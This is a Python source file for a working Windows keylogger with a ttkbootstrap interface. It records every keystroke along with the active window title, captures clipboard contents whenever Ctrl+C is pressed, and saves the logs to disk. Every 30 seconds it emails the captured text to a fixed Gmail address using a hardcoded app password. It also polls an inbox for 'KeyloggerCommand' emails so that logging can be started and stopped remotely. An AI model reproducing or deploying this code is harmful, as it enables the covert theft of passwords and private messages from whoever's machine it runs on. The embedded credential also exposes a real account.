import tkinter as tk
import ttkbootstrap as ttk
from ttkbootstrap.constants import *
from pynput import keyboard
import threading
import os
import time
from tkinter import filedialog, messagebox
import smtplib
from email.message import EmailMessage
import pyperclip
import win32gui
from collections import defaultdict
import imaplib
import email

EMAIL_SENDER = "keyloggerdetect@gmail.com"
EMAIL_PASSWORD = "zjyfdusapfdxntfr"  # Gmail App Password
EMAIL_RECEIVER = "sattwiksarkar18@gmail.com"

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("⚠️Keylogger")
        self.root.geometry("700x450")

        self.log_data = ""
        self.log_count = 0
        self.ctrl_pressed = False
        self.last_window = ""
        self.key_counts = defaultdict(int)
        self.logging = False
        self.log_thread = None

        self.title_label = ttk.Label(root, text="⚠️Keylogger", font=("Arial", 18, "bold"), bootstyle="danger")
        self.title_label.pack(pady=10)

        self.status_label = ttk.Label(root, text="🛑 Status: Inactive", font=("Arial", 12), bootstyle="secondary")
        self.status_label.pack(pady=5)

        self.text_area = tk.Text(root, height=10, width=80, state=DISABLED, wrap=tk.WORD)
        self.text_area.pack(padx=15, pady=5, fill=BOTH, expand=True)

        self.log_counter_label = ttk.Label(root, text="Keys Logged: 0", font=("Arial", 12))
        self.log_counter_label.pack(pady=5)

        self.btn_frame = ttk.Frame(root)
        self.btn_frame.pack(pady=10)

        self.start_button = ttk.Button(self.btn_frame, text="▶ Start Keylogger", bootstyle="success",
                                       command=self.start_keylogger, width=18, padding=10)
        self.start_button.pack(side=LEFT, padx=5)

        self.stop_button = ttk.Button(self.btn_frame, text="⏹ Stop Keylogger", bootstyle="secondary",
                                      command=self.stop_keylogger, state=DISABLED, width=18, padding=10)
        self.stop_button.pack(side=LEFT, padx=5)

        self.save_button = ttk.Button(self.btn_frame, text="💾 Save Logs", bootstyle="info", command=self.save_logs,
                                      width=18, padding=10)
        self.save_button.pack(side=LEFT, padx=5)

        self.clear_button = ttk.Button(self.btn_frame, text="🧹 Clear Logs", bootstyle="warning",
                                       command=self.clear_logs, width=18, padding=10)
        self.clear_button.pack(side=LEFT, padx=5)

        self.stats_button = ttk.Button(self.btn_frame, text="📊 Show Stats", bootstyle="primary",
                                       command=self.show_key_stats, width=18, padding=10)
        self.stats_button.pack(side=LEFT, padx=5)

        threading.Thread(target=self.email_command_listener, daemon=True).start()

    def start_keylogger(self):
        self.logging = True
        self.status_label.config(text="🟢 Status: Running", bootstyle="success")
        self.start_button.config(state=DISABLED)
        self.stop_button.config(state=NORMAL)

        self.log_thread = threading.Thread(target=self.log_keys, daemon=True)
        self.log_thread.start()

        threading.Thread(target=self.auto_send_logs, daemon=True).start()
        threading.Thread(target=self.save_logs_periodically, daemon=True).start()

    def stop_keylogger(self):
        self.logging = False
        self.status_label.config(text="🛑 Status: Inactive", bootstyle="secondary")
        self.start_button.config(state=NORMAL)
        self.stop_button.config(state=DISABLED)

    def format_key(self, key):
        try:
            return key.char
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.esc: "[ESC]",
            }
            return special_keys.get(key, f"[{key.name.upper()}]" if hasattr(key, "name") else str(key))

    def append_log(self, text):
        self.text_area.config(state=NORMAL)
        self.text_area.insert(tk.END, text)
        self.text_area.config(state=DISABLED)
        self.log_data += text

    def log_keys(self):
        def on_press(key):
            if not self.logging:
                return False
            char = self.format_key(key)
            current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if current_window != self.last_window:
                self.last_window = current_window
                window_info = f"\n\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Window: {current_window}\n"
                self.append_log(window_info)
            timestamp = time.strftime("[%H:%M:%S] ")
            self.append_log(timestamp + char + "\n")
            self.log_count += 1
            self.log_counter_label.config(text=f"Keys Logged: {self.log_count}")
            self.key_counts[char] += 1

            if hasattr(key, 'char') and self.ctrl_pressed and key.char == 'c':
                try:
                    clip_data = pyperclip.paste()
                    self.append_log(f"[CLIPBOARD] {clip_data}\n")
                except Exception as e:
                    self.append_log(f"[CLIPBOARD] Error reading clipboard: {e}\n")

            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.ctrl_pressed = True

        def on_release(key):
            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.ctrl_pressed = False

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    def save_logs(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if file_path:
            with open(file_path, "w", encoding="utf-8") as file:
                file.write(self.log_data)
            messagebox.showinfo("Success", "Logs saved successfully!")

    def clear_logs(self):
        self.text_area.config(state=NORMAL)
        self.text_area.delete("1.0", tk.END)
        self.text_area.config(state=DISABLED)
        self.log_data = ""
        self.log_count = 0
        self.key_counts.clear()
        self.log_counter_label.config(text="Keys Logged: 0")

    def show_key_stats(self):
        stats = sorted(self.key_counts.items(), key=lambda x: x[1], reverse=True)
        stat_text = "\nKey Frequency Stats:\n" + "\n".join([f"{k}: {v}" for k, v in stats])
        messagebox.showinfo("Key Stats", stat_text)

    def auto_send_logs(self):
        while self.logging:
            time.sleep(30)
            if self.log_data:
                try:
                    msg = EmailMessage()
                    msg.set_content(self.log_data)
                    msg["Subject"] = "Keylogger Logs"
                    msg["From"] = EMAIL_SENDER
                    msg["To"] = EMAIL_RECEIVER
                    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                        smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                        smtp.send_message(msg)
                    self.append_log("\n[\u2714] Logs sent successfully.\n")
                    self.log_data = ""
                except Exception as e:
                    self.append_log(f"\n[\u2718] Failed to send logs: {e}\n")

    def save_logs_periodically(self):
        os.makedirs("keylog", exist_ok=True)
        while self.logging:
            time.sleep(60)
            if self.log_data:
                filename = time.strftime("keylog/log_%Y-%m-%d_%H-%M-%S.txt")
                try:
                    with open(filename, "w", encoding="utf-8") as file:
                        file.write(self.log_data)
                    self.append_log(f"\n[💾] Log auto-saved to {filename}\n")
                except Exception as e:
                    self.append_log(f"\n[⚠️] Auto-save error: {e}\n")

    def email_command_listener(self):
        while True:
            cmd = self.check_email_command()
            if cmd == "START" and not self.logging:
                self.root.after(0, self.start_keylogger)
            elif cmd == "STOP" and self.logging:
                self.root.after(0, self.stop_keylogger)
            time.sleep(1)

    def check_email_command(self):
        try:
            mail = imaplib.IMAP4_SSL("imap.gmail.com")
            mail.login(EMAIL_SENDER, EMAIL_PASSWORD)
            mail.select("inbox")
            result, data = mail.search(None, '(UNSEEN SUBJECT "KeyloggerCommand")')
            ids = data[0].split()
            for email_id in ids:
                result, msg_data = mail.fetch(email_id, "(RFC822)")
                raw_email = msg_data[0][1]
                msg = email.message_from_bytes(raw_email)
                if msg.is_multipart():
                    body = msg.get_payload(0).get_payload(decode=True).decode()
                else:
                    body = msg.get_payload(decode=True).decode()
                if "START" in body.upper():
                    return "START"
                elif "STOP" in body.upper():
                    return "STOP"
            return None
        except Exception as e:
            print("Error checking email:", e)
            return None


if __name__ == "__main__":
    root = ttk.Window(themename="flatly")
    app = KeyloggerApp(root)
    root.mainloop()
